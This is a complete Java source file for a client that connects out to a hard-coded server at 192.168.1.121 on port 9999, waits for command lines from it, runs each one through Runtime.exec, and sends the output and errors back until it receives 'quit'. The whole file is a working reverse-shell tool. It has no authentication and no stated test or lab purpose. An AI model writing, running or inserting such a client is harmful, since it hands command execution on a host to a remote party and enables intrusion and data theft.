import java.io.*;
import java.net.*;

public class Client {
    private static Socket socket;
    private static BufferedReader in;
    private static BufferedWriter out;

    public static void main(String[] args) {
        String host = "192.168.1.121"; // Change to your server IP
        int port = 9999;

        try {
            System.out.println("[LOG] Starting client...");
            socket = new Socket(host, port);
            System.out.println("[LOG] Connected to " + host + ":" + port);

            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            out = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));

            String command;
            while ((command = in.readLine()) != null) {
                System.out.println("[LOG] Received command: " + command);

                if (command.equalsIgnoreCase("quit")) {
                    System.out.println("[LOG] Closing connection");
                    break;
                }

                String result = executeCommand(command);
                out.write(result + "\n");
                out.flush();
            }

            socket.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String executeCommand(String command) {
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            BufferedReader errorReader = new BufferedReader(
                    new InputStreamReader(process.getErrorStream()));

            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            while ((line = errorReader.readLine()) != null) {
                output.append(line).append("\n");
            }

            reader.close();
            errorReader.close();
        } catch (IOException e) {
            output.append("Error executing command: ").append(e.getMessage());
        }

        return output.toString().trim();
    }
}
